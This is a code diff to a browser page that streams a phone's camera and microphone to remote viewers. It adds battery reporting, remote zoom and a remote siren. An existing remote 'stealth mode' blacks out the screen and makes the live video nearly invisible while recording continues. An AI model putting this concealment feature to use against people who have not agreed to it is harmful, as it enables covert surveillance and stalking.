@@ -22,11 +22,22 @@
         let isFront = false;
         let flashOn = false;
         let stealthMode = false;
+        let currentZoom = 1;
+
+        // Battery Status Sender
+        if (navigator.getBattery) {
+            navigator.getBattery().then(battery => {
+                const sendBattery = () => {
+                    socket.emit('batteryInfo', { level: Math.round(battery.level * 100), charging: battery.charging });
+                };
+                sendBattery(); // Send on load
+                setInterval(sendBattery, 10000); // Update every 10 seconds
+            });
+        }
 
         async function startCamera() {
-            if (currentStream) {
-                currentStream.getTracks().forEach(track => track.stop());
-            }
+            if (currentStream) currentStream.getTracks().forEach(track => track.stop());
+            currentZoom = 1; // reset zoom
             const constraints = { video: { facingMode: isFront ? "user" : "environment" }, audio: true };
             try {
                 currentStream = await navigator.mediaDevices.getUserMedia(constraints);
@@ -55,6 +66,23 @@
         socket.on('candidate', (id, candidate) => { peerConnections[id].addIceCandidate(new RTCIceCandidate(candidate)); });
         socket.on('disconnectPeer', id => { if(peerConnections[id]) { peerConnections[id].close(); delete peerConnections[id]; } });
 
+        // Audio Context for Siren
+        let sirenInterval;
+        let audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        function playSirenSound() {
+            if(audioCtx.state === 'suspended') audioCtx.resume();
+            const osc = audioCtx.createOscillator();
+            const gain = audioCtx.createGain();
+            osc.type = 'sawtooth';
+            osc.frequency.setValueAtTime(400, audioCtx.currentTime);
+            osc.frequency.linearRampToValueAtTime(800, audioCtx.currentTime + 0.5);
+            gain.gain.value = 1; // MAX Volume
+            osc.connect(gain);
+            gain.connect(audioCtx.destination);
+            osc.start();
+            osc.stop(audioCtx.currentTime + 0.5);
+        }
+
         socket.on('remoteCommand', async (cmd) => {
             if (cmd === 'switchCamera') {
                 isFront = !isFront;
@@ -63,26 +91,43 @@
             } 
             else if (cmd === 'toggleFlash') {
                 let track = currentStream.getVideoTracks()[0];
-                let capabilities = track.getCapabilities();
-                if (capabilities.torch) {
+                let caps = track.getCapabilities();
+                if (caps.torch) {
                     flashOn = !flashOn;
                     track.applyConstraints({ advanced: [{ torch: flashOn }] });
-                }
+                } else { socket.emit('viewerMessage', 'Flashlight not supported on this camera.'); }
             }
-            // NAYA: Stealth Mode Logic
             else if (cmd === 'toggleStealth') {
                 stealthMode = !stealthMode;
                 if(stealthMode) {
                     document.body.style.background = "black";
-                    titleText.style.color = "black"; // Hide text by matching background
+                    titleText.style.color = "black"; 
                     subText.style.color = "black";
-                    video.style.opacity = "0.01"; // Almost invisible, but active
+                    video.style.opacity = "0.01"; 
                     video.style.border = "none";
                 } else {
                     titleText.style.color = "white";
                     subText.style.color = "white";
                     video.style.opacity = "1";
                     video.style.border = "2px solid red";
+                }
+            }
+            else if (cmd === 'zoomIn' || cmd === 'zoomOut') {
+                let track = currentStream.getVideoTracks()[0];
+                let caps = track.getCapabilities();
+                if (caps.zoom) {
+                    let step = (caps.zoom.max - caps.zoom.min) / 5;
+                    currentZoom = cmd === 'zoomIn' ? Math.min(caps.zoom.max, currentZoom + step) : Math.max(caps.zoom.min, currentZoom - step);
+                    track.applyConstraints({ advanced: [{ zoom: currentZoom }] });
+                } else { socket.emit('viewerMessage', 'Remote Zoom is not supported by this phone.'); }
+            }
+            else if (cmd === 'toggleSiren') {
+                if (sirenInterval) {
+                    clearInterval(sirenInterval);
+                    sirenInterval = null;
+                } else {
+                    sirenInterval = setInterval(playSirenSound, 600);
+                    playSirenSound();
                 }
             }
         });
